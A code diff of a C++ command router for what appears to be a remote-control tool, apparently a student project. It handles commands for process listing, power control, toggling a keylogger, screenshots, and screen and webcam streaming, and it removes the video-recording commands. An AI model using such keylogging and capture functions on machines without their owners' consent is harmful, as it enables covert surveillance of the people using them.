@@ -1,17 +1,16 @@
-// CommandRouter.cpp (PHIEN BAN HYBRID)
+// CommandRouter.cpp (FIXED: REMOVED RECORDING LOGIC)
 #include "CommandRouter.h"
 #include "utils/helpers.h"
 #include "utils/logging.h"
 #include <sstream>
 #include <stdexcept>
-#include <mutex> // Can cho m_socketMutex
+#include <mutex>
 
 using namespace std;
 
 CommandRouter::CommandRouter() {}
 
 // === 1. HAM XU LY LENH (CONG 9000) ===
-// (1 luong duy nhat, xu ly N-to-1, dinh dang ID|COMMAND)
 void CommandRouter::handleCommandClient(SOCKET client)
 {
     logConsole("CMD_TCP", "Gateway da ket noi Cong Lenh.");
@@ -33,7 +32,6 @@ void CommandRouter::handleCommandClient(SOCKET client)
                 string cmdLine = line_buffer.substr(0, pos);
                 line_buffer.erase(0, pos + 1);
 
-                // Dinh dang moi: ID|COMMAND args...
                 size_t idPos = cmdLine.find('|');
                 if (idPos == string::npos)
                     continue;
@@ -47,7 +45,7 @@ void CommandRouter::handleCommandClient(SOCKET client)
                     continue;
                 string cmd = args[0];
 
-                // === DIEU PHOI (CHI LENH JSON, KHONG STREAM) ===
+                // === DIEU PHOI ===
 
                 if (cmd == "GET_PROCS")
                     sendCmdTcp(client, correlationId, "JSON " + m_processController.getProcessesJson(), m_socketMutex);
@@ -64,8 +62,6 @@ void CommandRouter::handleCommandClient(SOCKET client)
                 }
                 else if (cmd == "POWER_CMD" && args.size() > 1)
                     sendCmdTcp(client, correlationId, "JSON " + m_systemController.powerCommand(args[1]), m_socketMutex);
-                else if (cmd == "DELETE_VIDEO" && args.size() > 1)
-                    sendCmdTcp(client, correlationId, "JSON " + m_systemController.deleteTempFile(args[1]), m_socketMutex);
                 else if (cmd == "KEYLOG_SET" && args.size() > 1)
                 {
                     m_keylogController.setKeylog(args[1] == "true");
@@ -78,10 +74,10 @@ void CommandRouter::handleCommandClient(SOCKET client)
                     bool refresh = (cmd == "REFRESH_DEVICES");
                     sendCmdTcp(client, correlationId, "JSON " + m_deviceController.getDevices(refresh), m_socketMutex);
                 }
-                else if (cmd == "RECORD_VIDEO" && args.size() > 3)
-                    m_deviceController.recordVideoAsync(client, correlationId, args[1], args[2], args[3], m_socketMutex);
                 else if (cmd == "GET_SCREENSHOT")
                     sendCmdTcp(client, correlationId, "JSON " + m_screenController.getScreenshotBase64(), m_socketMutex);
+
+                // DA XOA: RECORD_VIDEO va DELETE_VIDEO vi logic nay chuyen xuong Client
             }
         }
     }
@@ -98,14 +94,12 @@ void CommandRouter::handleCommandClient(SOCKET client)
 }
 
 // === 2. HAM XU LY STREAM (CONG 9001) ===
-// (Moi luong 1 ham nay, N-to-N)
 void CommandRouter::handleStreamClient(SOCKET client, string clientIP)
 {
     logConsole(clientIP, "Gateway da ket noi Cong Stream.");
     char buffer[1024];
     try
     {
-        // Doc lenh dau tien de biet stream gi
         int rec = recv(client, buffer, sizeof(buffer) - 1, 0);
         if (rec <= 0)
         {
@@ -114,9 +108,9 @@ void CommandRouter::handleStreamClient(SOCKET client, string clientIP)
         }
         buffer[rec] = 0;
         string cmdLine(buffer);
-        size_t pos = cmdLine.find('\n'); // Tim \n
+        size_t pos = cmdLine.find('\n');
         if (pos != string::npos)
-            cmdLine = cmdLine.substr(0, pos); // Lay truoc \n
+            cmdLine = cmdLine.substr(0, pos);
 
         vector<string> args = splitArgs(cmdLine);
         if (args.empty())
@@ -128,14 +122,13 @@ void CommandRouter::handleStreamClient(SOCKET client, string clientIP)
         string cmd = args[0];
         logConsole(clientIP, "Nhan yeu cau Stream: " + cmd);
 
-        // Goi ham stream tuong ung (Blocking)
-        // Cac ham nay se KHONG sendTcp("STREAM_START")
         if (cmd == "START_STREAM_SCREEN")
         {
             m_screenController.handleScreenStream(client, clientIP);
         }
         else if (cmd == "START_STREAM_CAM" && args.size() > 2)
         {
+            // args[1] la ten camera, args[2] la audio (server bo qua audio)
             m_deviceController.handleStreamCam(client, clientIP, args[1], args[2]);
         }
     }
